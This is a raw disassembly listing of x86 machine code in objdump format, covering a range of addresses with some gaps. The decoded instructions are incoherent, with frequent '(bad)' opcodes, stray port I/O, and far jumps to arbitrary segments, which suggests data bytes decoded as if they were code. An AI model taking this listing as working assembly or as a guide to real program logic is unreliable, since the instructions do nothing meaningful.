  420f9d:	inc    esi
  420f9e:	push   es
  420f9f:	adc    BYTE PTR [edi-0x4c],ah
  420fa2:	sahf   
  420fa3:	dec    edi
  420fa4:	mov    ch,0x50
  420fa6:	jecxz  0x420ff3
  420fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa9:	sahf   
  420faa:	lea    ebp,[eax+0x6cfbe80]
  420fb0:	cmp    edi,DWORD PTR [ebx]
  420fb2:	dec    edi
  420fb3:	(bad)  
  420fb4:	jmp    0xee30:0x8a0a91dd
  420fbb:	call   0x6155:0x7e5f8c21
  420fc2:	pop    ecx
  420fc3:	scas   al,BYTE PTR es:[edi]
  420fc4:	lds    ebp,FWORD PTR [esp+edi*1-0x2e3da380]
  420fcb:	dec    esi
  420fcc:	pop    esp
  420fcd:	aam    0x9c
  420fcf:	fistp  QWORD PTR [esi]
  420fd1:	mov    WORD PTR [eax+eiz*4-0x3b],gs
  420fd5:	mov    dh,0x50
  420fd7:	mov    dh,0x7e
  420fd9:	mov    edx,0x19661b28
  420fde:	xor    BYTE PTR [edx-0x50],bh
  420fe1:	mov    dh,0x95
  420fe3:	or     dl,BYTE PTR [ecx+eiz*1+0x42]
  420fe7:	out    dx,al
  420fe8:	outs   dx,BYTE PTR es:[esi]
  420fea:	add    ebx,DWORD PTR [ebx+0x42]
  420fed:	jmp    0x421008
  420fef:	sbb    eax,0x6ebd311e
  420ff4:	fidivr DWORD PTR [edi]
  420ff6:	pop    esp
  420ff7:	xchg   edi,eax
  420ff8:	pop    ds
  420ff9:	pushf  
  420ffa:	inc    esp
  420ffb:	sbb    ebx,DWORD PTR [edx+eax*4-0x72]
  420fff:	jnp    0x420fa4
  421001:	inc    BYTE PTR [ecx-0x60]
  421004:	addr16 (bad) 
  421006:	mov    esp,0xf3ba8cf2
  42100b:	mov    esp,0x63a4919a
  421010:	ja     0x42108f
  421012:	sar    ecx,cl
  421014:	mov    WORD PTR [ecx-0x7451ea2a],?
  42101a:	dec    edi
  42101b:	das    
  42101c:	stc    
  42101d:	fs jns 0x420fe1
  421020:	je     0x421009
  421022:	mov    ss,edi
  421024:	dec    esp
  421025:	rcr    esi,1
  421027:	adc    eax,ecx
  421029:	(bad)  
  42102a:	scas   al,BYTE PTR es:[edi]
  42102b:	cld    
  42102c:	nop
  42102d:	mov    edi,ebp
  42102f:	xchg   ebp,eax
  421030:	enter  0xf75c,0x9
  421034:	inc    edi
  421035:	pop    ecx
  421036:	retf   
  421037:	jmp    DWORD PTR [ebx+0x66739d87]
  42103d:	add    DWORD PTR [esi],0x654d1d88
  421043:	out    0x9f,eax
  421045:	inc    esp
  421046:	sub    al,0x2b
  421048:	xchg   esi,eax
  421049:	mov    dl,0x29
  42104b:	fidiv  WORD PTR [ebp+0x13]
  42104e:	fcmovu st,st(5)
  421050:	push   esi
  421051:	fwait
  421052:	or     dh,dh
  421054:	inc    ebp
  421055:	ins    DWORD PTR es:[edi],dx
  421056:	cmc    
  421057:	ins    BYTE PTR es:[edi],dx
  421058:	call   0x7814:0x5686f228
  42105f:	in     eax,dx
  421060:	mov    eax,ds:0x8ff09fe9
  421065:	call   0xf47695d4
  42106a:	call   0x5ebc6c40
  42106f:	adc    eax,0x69137532
  421074:	xchg   esi,eax
  421075:	mov    ah,0xe2
  421077:	push   ecx
  421078:	stc    
  421079:	sbb    al,0x8b
  42107b:	leave  
  42107c:	add    DWORD PTR [ebp+0x75fb92b],ebx
  421082:	or     eax,0x2c22fbe7
  421087:	pushf  
  421088:	sbb    DWORD PTR [ecx+0x76],edi
  42108b:	pop    es
  42108c:	sbb    bh,BYTE PTR [eax+0x37197f]
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [ebx+edx*2-0x11]
  421103:	nop
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x65000001
  42110d:	xchg   DWORD PTR [eax+0x4fad2d0f],edi
  421113:	mov    edi,0x870de0e0
  421118:	test   eax,0xc954caf0
  42111d:	inc    eax
  42111e:	(bad)  
  42111f:	enter  0x424d,0x3
  421123:	xchg   edi,eax
  421124:	inc    ecx
  421125:	or     esi,edi
  421127:	es cld 
  421129:	pop    ss
  42112a:	mov    al,0x46
  42112c:	sub    eax,0xecb131f6
  421131:	fst    DWORD PTR ds:0xf645848d
  421137:	dec    eax
  421138:	xchg   esp,eax
  421139:	push   es
  42113a:	inc    eax
  42113b:	mov    esi,0x78f031a7
  421140:	pop    ss
  421141:	dec    ebp
  421142:	push   ebp
  421143:	(bad)  
  421144:	fdiv   QWORD PTR [ecx+0x5f1caeea]
  42114a:	mov    es,WORD PTR [esi+0x71ee9f17]
  421150:	in     al,dx
  421151:	mov    edi,0x2aec4d2e
  421156:	and    cl,BYTE PTR [ebx-0x9852306]
  42115c:	mov    bl,0xfe
  42115e:	and    eax,0xee1cce4b
  421163:	xor    eax,0x1644f3da
  421168:	loope  0x421149
  42116a:	pop    edi
  42116b:	pop    edx
  42116c:	xchg   ebp,eax
  42116d:	jge    0x4211ad
  42116f:	xor    eax,0x71e4a897
  421174:	push   edx
  421175:	xchg   ebx,eax
  421176:	jle    0x4211e9
  421178:	pop    esi
  421179:	mov    bh,0x46
  42117b:	xchg   esp,esp
  42117d:	das    
  42117e:	mov    ds:0xe00e2633,eax
  421183:	enter  0xd2c4,0x6d
  421187:	push   ecx
  421188:	fild   DWORD PTR [edi-0x40]
  42118b:	(bad)  
  42118c:	iret   
  42118d:	cdq    
  42118e:	ins    DWORD PTR es:[edi],dx
  42118f:	inc    edx
  421190:	mov    dl,0x67
  421192:	xor    DWORD PTR [eax-0x12],ebx
  421195:	mov    esi,edx
  421197:	test   BYTE PTR [edx],dl
  421199:	push   ebx
  42119a:	push   edi
  42119b:	add    DWORD PTR [esi+0x31],0x9a7a84df
  4211a2:	and    al,0xff
  4211a4:	pop    es
  4211a5:	out    dx,eax
  4211a6:	inc    ebp
  4211a7:	jae    0x42112c
  4211a9:	sub    eax,0xc937ba8d
  4211ae:	fdivr  DWORD PTR [ebp-0x2e4a8409]
  4211b4:	(bad)  
  4211b6:	jns    0x4211c2
  4211b8:	xchg   edx,eax
  4211b9:	scas   eax,DWORD PTR es:[edi]
  4211ba:	push   ds
  4211bb:	sbb    eax,0x5903e134
  4211c0:	(bad)  
  4211c1:	dec    edx
  4211c2:	or     al,0x21
  4211c4:	jb     0x42121b
  4211c6:	bound  ebp,QWORD PTR [esi]
  4211c8:	enter  0xf26b,0xf6
  4211cc:	mov    ebp,0x264a4529
  4211d1:	pop    eax
  4211d2:	test   al,0xe5
  4211d4:	xchg   ebp,eax
  4211d5:	enter  0x7e5b,0x16
  4211d9:	les    ecx,FWORD PTR [ecx+edx*8+0x3]
  4211dd:	mov    ch,0xec
  4211df:	dec    edi
  4211e0:	push   ebx
  4211e1:	out    0x4f,al
  4211e3:	in     eax,0x37
  4211e5:	adc    eax,0x2e2ede6f
  4211ea:	arpl   WORD PTR [eax+0x553312d4],cx
  4211f0:	out    dx,eax
  4211f1:	mov    cl,bl
  4211f3:	add    edx,DWORD PTR [ecx]
  4211f5:	mov    eax,0x286d832f
  4211fa:	mov    dh,0x9
  4211fc:	lods   al,BYTE PTR ds:[esi]
  4211fd:	sbb    bh,BYTE PTR [esp+ecx*1+0x30]
  421201:	loopne 0x421277
  421203:	jecxz  0x4211fa
  421205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421206:	icebp  
  421207:	mov    edx,0x6ae57824
  42120c:	push   ebp
  42120d:	push   0xffffff84
  42120f:	jmp    0x4212e5
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x77ab32d
  421281:	fs call 0x1a3b01d
  421287:	add    BYTE PTR ds:0x8a000001,al
  42128d:	es push edi
  42128f:	xor    DWORD PTR ss:[ebx-0x18],eax
  421293:	push   esi
  421294:	inc    eax
  421295:	push   ebp
  421296:	mov    bh,0x8
  421298:	xchg   DWORD PTR [ebx+0x51],edi
  42129b:	cmp    ebx,ecx
  42129d:	outs   dx,BYTE PTR ds:[esi]
  42129e:	pop    esp
  42129f:	push   cs
  4212a0:	shl    BYTE PTR [edi],1
  4212a2:	mov    ebx,0x622bf4f8
  4212a7:	inc    esi
  4212a8:	mov    ds:0x9e0babf7,eax
  4212ad:	arpl   bp,si
  4212af:	daa    
  4212b0:	cmp    eax,0x276f277e
  4212b5:	cli    
  4212b6:	push   eax
  4212b7:	xor    DWORD PTR [edi-0x59],edx
  4212ba:	sub    al,0xbe
  4212bc:	mov    eax,0x478613a1
  4212c1:	je     0x42126c
  4212c3:	ret    0x99f8
  4212c6:	cmp    BYTE PTR [edi-0xf],ch
  4212c9:	(bad)  
  4212cb:	push   esp
  4212cc:	mov    dh,0x8a
  4212ce:	fst    QWORD PTR [eax-0x6ce62c66]
  4212d4:	dec    ebx
  4212d5:	(bad)  
  4212d6:	into   
  4212d7:	retf   
  4212d8:	(bad)  
  4212d9:	ds in  al,0xf3
  4212dc:	and    ebx,0x81e43657
  4212e2:	cmp    bh,bh
  4212e4:	mov    al,0xd5
  4212e6:	(bad)  
  4212e8:	mov    eax,ds:0xd2057ef8
  4212ed:	(bad)  
  4212ef:	inc    edi
  4212f0:	test   al,0xa6
  4212f2:	or     DWORD PTR [edx+0x2b],esi
  4212f5:	ret    
  4212f6:	lds    edx,FWORD PTR [edx]
  4212f8:	push   ds
  4212f9:	sahf   
  4212fa:	jmp    0x14cf:0x49718ae0
  421301:	fsub   DWORD PTR [eax+0x8]
  421304:	dec    ecx
  421305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421306:	imul   ebp,DWORD PTR [ebp-0x5f],0x628676da
  42130d:	cmp    ebx,edi
  42130f:	retf   0x8115
  421312:	call   0x35dde064
  421317:	(bad)  
  421319:	pop    ecx
  42131a:	ins    BYTE PTR es:[edi],dx
  42131b:	cmp    edi,DWORD PTR [ecx]
  42131d:	fadd   QWORD PTR [eax-0x69]
  421320:	aad    0x42
  421322:	xor    eax,0xc0eab4cb
  421327:	xlat   BYTE PTR ds:[ebx]
  421328:	xor    esp,esi
  42132a:	daa    
  42132b:	cmp    ebp,DWORD PTR [eax+0x2f4e86a9]
  421331:	cmp    ebp,eax
  421333:	(bad)  [ecx+0x48c71fb]
  421339:	int3   
  42133a:	inc    esp
  42133b:	xor    dl,BYTE PTR [edi-0x58f8fc9c]
  421341:	xchg   ebx,eax
  421342:	mov    cl,0x89
  421344:	mov    bh,0x1f
  421346:	test   ebx,edi
  421348:	xlat   BYTE PTR ds:[ebx]
  421349:	fidivr DWORD PTR [ecx]
  42134b:	sar    dl,cl
  42134d:	out    dx,al
  42134e:	jbe    0x421335
  421350:	hlt    
  421351:	mov    ebp,0x4c5ca646
  421356:	pusha  
  421357:	sub    BYTE PTR es:[eax],cl
  42135a:	push   esp
  42135b:	dec    ebp
  42135c:	pop    ebx
  42135d:	pop    ecx
  42135e:	push   edi
  42135f:	psrad  mm6,QWORD PTR [edi+edx*8-0x2d]
  421364:	mov    esp,0x9cba4db
  421369:	(bad)  
  42136a:	sbb    BYTE PTR [esi],dl
  42136c:	scas   al,BYTE PTR es:[edi]
  42136d:	(bad)  
  42136e:	enter  0x97a,0x10
  421372:	xchg   esp,eax
  421373:	(bad)  
  421374:	je     0x421371
  421376:	cmp    BYTE PTR [edx+0x10d5a094],dl
  42137c:	jo     0x42139c
  42137e:	ret    0x2ab2
  421381:	pop    ss
  421382:	inc    ebx
  421383:	xor    al,0x36
  421385:	xchg   BYTE PTR [esp+esi*4],dh
  421388:	pop    eax
  421389:	or     eax,0xa0714b38
  42138e:	ret    
  42138f:	stos   DWORD PTR es:[edi],eax
  421390:	rol    BYTE PTR [eax],cl
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x6c26f49f]
  421402:	retf   
  421403:	out    0xa2,eax
  421405:	bound  eax,QWORD PTR [ecx]
  421407:	add    BYTE PTR ds:0x75000001,al
  42140d:	inc    edi
  42140e:	pop    ss
  42140f:	arpl   WORD PTR [edx+0x27],sp
  421412:	aam    0x90
  421414:	jbe    0x421416
  421416:	xchg   ebx,eax
  421417:	ss inc edx
  421419:	mov    ah,0x27
  42141b:	sbb    esi,esi
  42141d:	push   esp
  42141e:	out    0x1f,eax
  421420:	iret   
  421421:	mov    ebp,0x4917465c
  421426:	inc    ebp
  421427:	xchg   edi,eax
  421428:	mov    dl,0x51
  42142a:	xor    BYTE PTR [ebx+0x3e],ah
  42142d:	push   esp
  42142e:	jmp    0x591d6ed3
  421433:	aad    0x7e
  421435:	inc    esi
  421436:	mov    al,ds:0x4703b5f8
  42143b:	mov    cl,0xff
  42143d:	jmp    0x421444
  42143f:	je     0x4214a0
  421441:	inc    ecx
  421442:	rcl    DWORD PTR [ebx],1
  421444:	push   edx
  421445:	add    ch,BYTE PTR [edi+0x3095481]
  42144b:	lods   al,BYTE PTR ds:[esi]
  42144c:	inc    esi
  42144d:	test   eax,0xfd841f2d
  421452:	aad    0x4
  421454:	push   ds
  421455:	inc    ecx
  421456:	jne    0x4213f3
  421458:	aam    0x7f
  42145a:	sbb    DWORD PTR [esi],0xfffffff8
  42145d:	ret    0x1009
  421460:	repnz fstp DWORD PTR [eax]
  421463:	syscall 
  421465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421466:	adc    eax,0xe7298a9b
  42146b:	dec    ecx
  42146c:	mov    bl,BYTE PTR [esi]
  42146e:	jb     0x4214cf
  421470:	sub    eax,0x3a38fdf5
  421475:	rol    BYTE PTR [edi+0x1054814],0xec
  42147c:	idiv   BYTE PTR [edx]
  42147e:	test   al,dl
  421480:	arpl   WORD PTR [esi],cx
  421482:	sti    
  421483:	popf   
  421484:	adc    eax,0xf5ed7dbd
  421489:	fnstsw WORD PTR [si+0x4a]
  42148d:	inc    edi
  42148e:	stc    
  42148f:	inc    ebx
  421490:	jb     0x421457
  421492:	dec    ebp
  421493:	and    esp,DWORD PTR [ecx+0x34638755]
  421499:	test   eax,0x9a359b6e
  42149e:	inc    ebx
  42149f:	in     al,0x93
  4214a1:	scas   eax,DWORD PTR es:[edi]
  4214a2:	sbb    ch,ah
  4214a4:	pop    edx
  4214a5:	cld    
  4214a6:	sub    eax,0x7a4e7795
  4214ab:	not    DWORD PTR [ebx]
  4214ad:	or     BYTE PTR [edx+0x3e],ah
  4214b0:	push   0x6b
  4214b2:	(bad)  
  4214b3:	fisttp QWORD PTR [edi+0x8]
  4214b6:	push   eax
  4214b7:	cmp    ah,BYTE PTR [esi]
  4214b9:	(bad)
  4214bd:	scas   al,BYTE PTR es:[edi]
  4214be:	int    0xc5
  4214c0:	imul   edi,eax,0x39ff1562
  4214c6:	repnz mov BYTE PTR [eax],0x4b
  4214ca:	jp     0x4214b1
  4214cc:	xor    eax,0xd8234fe2
  4214d1:	dec    eax
  4214d2:	jmp    0x5c97:0xc7f6c8f2
  4214d9:	ret    0xa70d
  4214dc:	jne    0x4214c3
  4214de:	js     0x421478
  4214e0:	fucompp 
  4214e2:	cwde   
  4214e3:	pop    ebx
  4214e4:	nop
  4214e5:	jg     0x42155e
  4214e7:	inc    ecx
  4214e8:	inc    ebx
  4214e9:	cmc    
  4214ea:	imul   ebx,DWORD PTR [edi-0x3eefbf96],0x9198f334
  4214f4:	add    eax,0x7740a8f0
  4214f9:	dec    ecx
  4214fa:	inc    ecx
  4214fb:	int3   
  4214fc:	imul   edx,DWORD PTR [ebp-0x31],0x48b4a622
  421503:	fsubr  DWORD PTR [eax]
  421505:	sub    esp,DWORD PTR [edi+ebx*4]
  421508:	cmp    esi,0x7fe3b33b
  42150e:	and    BYTE PTR [esi+eax*4],0x0
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x25f5bd4c],bp
  421582:	arpl   dx,cx
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x20000001,al
  42158d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42158e:	xchg   esi,eax
  42158f:	mov    bh,BYTE PTR [ebx]
  421591:	(bad)  
  421592:	aaa    
  421593:	xor    ebx,ebp
  421595:	pslld  mm4,QWORD PTR [ecx-0x61e6ff8c]
  42159c:	add    DWORD PTR [edx+0x325e5fd],ecx
  4215a2:	jmp    0x687e:0x85e8824a
  4215a9:	pop    ss
  4215aa:	push   ebx
  4215ab:	mov    ds:0x8efba154,al
  4215b0:	mov    WORD PTR [ebp+0x336268a0],es
  4215b6:	jns    0x4215a3
  4215b8:	adc    al,0xb5
  4215ba:	aas    
  4215bb:	xchg   ebx,eax
  4215bc:	inc    esp
  4215bd:	adc    eax,0x11dcb59d
  4215c2:	int    0x92
  4215c4:	data16 fistp QWORD PTR [edi+0x11676f66]
  4215cb:	shr    DWORD PTR [esp+edx*4+0x7f6266ae],cl
  4215d2:	push   es
  4215d3:	pop    ds
  4215d4:	test   DWORD PTR [ebx-0x393c19b8],esi
  4215da:	jbe    0x421596
  4215dc:	mov    dl,0xb3
  4215de:	mov    bh,0xa4
  4215e0:	gs inc esi
  4215e2:	lea    esi,[edx]
  4215e4:	dec    ebx
  4215e5:	outs   dx,DWORD PTR ds:[esi]
  4215e6:	xor    esp,DWORD PTR [ecx+0x6b]
  4215e9:	cld    
  4215ea:	mov    ebp,0xf632c670
  4215ef:	jbe    0x421576
  4215f1:	loopne 0x4215bd
  4215f3:	inc    eax
  4215f4:	push   esi
  4215f5:	mov    ch,0x44
  4215f7:	enter  0x92fc,0x2
  4215fb:	pop    esi
  4215fc:	and    ebp,DWORD PTR [esi]
  4215fe:	fistp  DWORD PTR ss:[ebp-0x6963a4a0]
  421605:	idiv   DWORD PTR [eax-0x3c585535]
  42160b:	data16 lahf 
  42160d:	jnp    0x421625
  42160f:	mov    bl,0x87
  421611:	jne    0x42161a
  421613:	jmp    0x421648
  421615:	add    eax,0x228f57f0
  42161a:	mov    esi,0xba82579b
  42161f:	xor    esi,DWORD PTR [esi-0x75]
  421622:	xchg   ebx,eax
  421623:	jge    0x42164e
  421625:	cli    
  421626:	jbe    0x421608
  421628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421629:	leave  
  42162a:	sbb    al,0x2c
  42162c:	jo     0x421686
  42162e:	push   ebx
  42162f:	jmp    0xe5949ff5
  421634:	mov    edi,0x6bb2ac8d
  421639:	xor    eax,0xe6a80f30
  42163e:	in     al,dx
  42163f:	sub    esi,ecx
  421641:	mov    ecx,0xb7cc2b5c
  421646:	test   DWORD PTR [ecx+ebp*8],esp
  421649:	cmp    BYTE PTR [ecx],dl
  42164b:	cmp    dl,BYTE PTR [ecx]
  42164d:	in     eax,0xf6
  42164f:	jb     0x4215d9
  421651:	daa    
  421652:	pop    edx
  421653:	std    
  421654:	cmp    DWORD PTR [edx-0x3ce41c0a],0xffffffde
  42165b:	gs popa 
  42165d:	or     al,0x41
  42165f:	mov    esi,0xc478e6b3
  421664:	jl     0x4216a7
  421666:	mov    cl,0x1d
  421668:	cmp    BYTE PTR ds:0x16a37898,0x78
  42166f:	push   edi
  421670:	mov    al,0x91
  421672:	xchg   BYTE PTR [edi],bh
  421674:	add    eax,0x6c55d301
  421679:	lods   eax,DWORD PTR ds:[esi]
  42167a:	cmp    cl,ah
  42167c:	or     eax,0xa4a03e9f
  421681:	xchg   ebx,eax
  421682:	fdivr  st,st(5)
  421684:	ins    BYTE PTR es:[edi],dx
  421685:	sysexit 
  421687:	jecxz  0x4216c3
  421689:	data16 repz sti 
  42168c:	push   ebp
  42168d:	call   0x0:0xa4cf00
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	sub    BYTE PTR [ecx+0x51],0xb1
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0xe4000001
  42170d:	pop    esi
  42170e:	je     0x4216a1
  421710:	dec    edx
  421711:	test   BYTE PTR [ebx],dh
  421713:	pushf  
  421714:	hlt    
  421715:	repnz add BYTE PTR [ecx-0x5a],bh
  421719:	(bad)  
  42171a:	cld    
  42171b:	push   0x1b081cf3
  421720:	ror    bh,0xee
  421723:	pop    esi
  421724:	arpl   sp,di
  421726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421727:	test   dl,cl
  421729:	adc    al,0x21
  42172b:	adc    eax,0x59e72387
  421730:	sti    
  421731:	lock cmp DWORD PTR [eax-0x4e99a95a],eax
  421738:	cmc    
  421739:	ret    0x43bd
  42173c:	aad    0x7f
  42173e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42173f:	test   al,0xe1
  421741:	sar    BYTE PTR [eax-0x5b],cl
  421744:	and    al,0x10
  421746:	sbb    esp,edi
  421748:	pop    ebx
  421749:	push   0x27c12907
  42174e:	out    0xb2,al
  421750:	in     al,0x43
  421752:	mov    eax,0x4513ea5c
  421757:	or     al,0x46
  421759:	(bad)  
  42175a:	(bad)  
  42175b:	lock and al,0xb2
  42175e:	push   edx
  42175f:	out    dx,eax
  421760:	mov    esp,DWORD PTR [eax-0x6d22db83]
  421766:	sub    DWORD PTR [eax],edi
  421768:	shr    DWORD PTR [ebx+0x51],1
  42176b:	jmp    0x4c4e1738
  421770:	hlt    
  421771:	push   0x9cee3f4d
  421776:	mov    edi,0x62fe6173
  42177b:	and    BYTE PTR [eax+ebx*2+0x7c915799],dh
  421782:	jo     0x421749
  421784:	pushf  
  421785:	xor    dh,bl
  421787:	xchg   ebp,eax
  421788:	daa    
  421789:	mov    edx,0x53d1908a
  42178e:	cmp    ch,BYTE PTR [ebx+0x5a]
  421791:	mov    bh,0x29
  421793:	sbb    edx,ebp
  421795:	sbb    DWORD PTR [eax],edi
  421797:	inc    ebp
  421798:	sub    al,0xf6
  42179a:	dec    ecx
  42179b:	jmp    0xc877d507
  4217a0:	cwde   
  4217a1:	loopne 0x42177d
  4217a3:	ins    BYTE PTR es:[edi],dx
  4217a4:	sti    
  4217a5:	push   es
  4217a6:	je     0x421779
  4217a8:	(bad)  
  4217aa:	fidivr WORD PTR ds:0x81499307
  4217b0:	out    dx,al
  4217b1:	jns    0x421760
  4217b3:	call   0x69f7:0x1a500b99
  4217ba:	(bad)  
  4217bb:	jmp    0xecadcb55
  4217c0:	mov    ds:0x2187a50,al
  4217c5:	push   0xfffffff7
  4217c7:	bound  ebp,QWORD PTR [esi-0x42]
  4217ca:	(bad)  
  4217cb:	outs   dx,DWORD PTR ds:[esi]
  4217cc:	int3   
  4217cd:	dec    DWORD PTR [eax]
  4217cf:	rcr    BYTE PTR [ecx-0x55c9d6df],cl
  4217d5:	sbb    eax,DWORD PTR [edx-0xb]
  4217d8:	inc    ecx
  4217d9:	ins    BYTE PTR es:[edi],dx
  4217da:	adc    DWORD PTR [edi-0x58752ebf],esi
  4217e0:	cmp    ch,ch
  4217e2:	ror    DWORD PTR [esi+ecx*8],0xa4
  4217e6:	stos   DWORD PTR es:[edi],eax
  4217e7:	mov    ebx,gs
  4217e9:	ss int3 
  4217eb:	cld    
  4217ec:	xor    al,0xb0
  4217ee:	mov    esp,DWORD PTR [ecx]
  4217f0:	scas   eax,DWORD PTR es:[edi]
  4217f1:	stc    
  4217f2:	mov    ah,0xad
  4217f4:	jp     0x4217e6
  4217f6:	jae    0x4217a8
  4217f8:	fldenv ds:0x680a2b24
  4217fe:	ins    DWORD PTR es:[edi],dx
  4217ff:	adc    eax,DWORD PTR [ebx-0x6fbdfb85]
  421805:	sub    BYTE PTR [ebp-0x5b01df29],bh
  42180b:	dec    ebx
  42180c:	xor    DWORD PTR [ebx],eax
  42180e:	dec    esp
  42180f:	je     0x4217ce
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	mov    ebp,0xb13effdf
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    eax,0x4000001
  42188d:	aaa    
  42188e:	arpl   WORD PTR [ecx+edi*1],bp
  421891:	fsub   QWORD PTR [ecx-0x3f]
  421894:	sar    BYTE PTR [edi],1
  421896:	add    BYTE PTR [ecx],bl
  421898:	sti    
  421899:	add    BYTE PTR [eax-0x61],dl
  42189c:	mov    al,ds:0x968daad1
  4218a1:	das    
  4218a2:	leave  
  4218a3:	xchg   ecx,eax
  4218a4:	sub    DWORD PTR ds:0xf4c3c0d7,eax
  4218aa:	cmp    ah,BYTE PTR [edi+0x22]
  4218ad:	fwait
  4218ae:	xchg   ecx,eax
  4218af:	dec    edx
  4218b0:	cmp    esp,DWORD PTR [ebp-0xa]
  4218b3:	dec    ecx
  4218b4:	jge    0x421851
  4218b6:	jbe    0x4218fc
  4218b8:	repnz inc ecx
  4218ba:	nop
  4218bb:	fcomp  DWORD PTR [esi]
  4218bd:	out    0x3a,eax
  4218bf:	or     al,0x5
  4218c1:	push   0x95d0a3e4
  4218c6:	pop    esi
  4218c7:	pushf  
  4218c8:	jns    0x4218f2
  4218ca:	pop    esp
  4218cb:	sti    
  4218cc:	jo     0x4218b9
  4218ce:	cli    
  4218cf:	adc    eax,0x7fb0233e
  4218d4:	enter  0xbaa3,0x2c
  4218d8:	test   DWORD PTR [ecx],esp
  4218da:	icebp  
  4218db:	mov    edi,0x47fe1768
  4218e0:	arpl   WORD PTR [edx-0x574c0947],sp
  4218e6:	imul   eax,ebp,0x2ac728c4
  4218ec:	cld    
  4218ed:	fwait
  4218ee:	add    esp,edi
  4218f0:	inc    ebp
  4218f1:	test   eax,0x576faebc
  4218f6:	inc    ebp
  4218f7:	push   esp
  4218f8:	rcl    BYTE PTR [ebx+0x6885c7d9],0x2
  4218ff:	sbb    DWORD PTR [ecx+0x1bdebc8d],esi
  421905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421907:	sti    
  421908:	ja     0x421897
  42190a:	pop    edi
  42190b:	(bad)  
  42190d:	xor    dh,al
  42190f:	push   esp
  421910:	push   0x3f
  421912:	mov    ds:0x69dceed6,eax
  421917:	mov    esi,0x75fc49c6
  42191c:	pop    ss
  42191d:	std    
  42191e:	or     ah,BYTE PTR [ecx-0x2c]
  421921:	dec    ebp
  421922:	mov    cs,WORD PTR [edi-0x7e7f74e4]
  421928:	push   ebp
  421929:	fcom   DWORD PTR [ebp+0x5f]
  42192c:	shl    cl,1
  42192e:	jg     0x42190d
  421930:	out    dx,al
  421931:	lock pop esp
  421933:	je     0x4218b9
  421935:	scas   eax,DWORD PTR es:[edi]
  421936:	adc    DWORD PTR [ecx+0x4e],ebx
  421939:	arpl   WORD PTR [esi-0x77ecd106],di
  42193f:	imul   ebp,DWORD PTR [eax-0x5b],0x88efd7c3
  421946:	pop    eax
  421947:	push   edi
  421948:	ja     0x42196d
  42194a:	inc    ecx
  42194b:	cmp    al,BYTE PTR [ebp-0x3e]
  42194e:	sbb    bh,al
  421950:	fs jae 0x4219a5
  421953:	push   0xc71295d5
  421958:	loop   0x4219d9
  42195a:	es dec ebx
  42195c:	stc    
  42195d:	ds fcmovnbe st,st(2)
  421960:	outs   dx,DWORD PTR ds:[esi]
  421961:	and    BYTE PTR [ecx-0x61],0xd9
  421965:	mov    DWORD PTR [eax+0x67f3f285],esp
  42196b:	xchg   ecx,eax
  42196c:	shr    BYTE PTR [ebx+0x59],0x2a
  421970:	call   0xab96:0x25e086bc
  421977:	repnz push 0x5eba595c
  42197d:	inc    ecx
  42197e:	xor    BYTE PTR [ecx-0x45575b7d],ah
  421984:	mov    cl,BYTE PTR [esi]
  421986:	xor    eax,DWORD PTR [ecx+esi*4-0x54]
  42198a:	adc    BYTE PTR [ecx+0x7feeadb3],al
  421990:	or     eax,0x0
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	add    DWORD PTR [ebx+0x66b66a3d],0x1050001
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	or     al,0xbd
  421a0e:	call   0xbc1ebccf
  421a13:	push   ds
  421a14:	mov    dl,0xfd
  421a16:	loopne 0x4219d4
  421a18:	push   edx
  421a19:	push   cs
  421a1a:	inc    esp
  421a1b:	push   cs
  421a1c:	scas   al,BYTE PTR es:[edi]
  421a1d:	dec    esp
  421a1e:	pusha  
  421a1f:	aam    0xd2
  421a21:	repnz cmc 
  421a23:	(bad)  
  421a24:	sbb    esi,DWORD PTR [edi-0x7d9fbf8f]
  421a2a:	ss ss mov bh,0x2b
  421a2e:	cmp    ecx,edi
  421a30:	imul   edx,DWORD PTR [eax],0x87ec189d
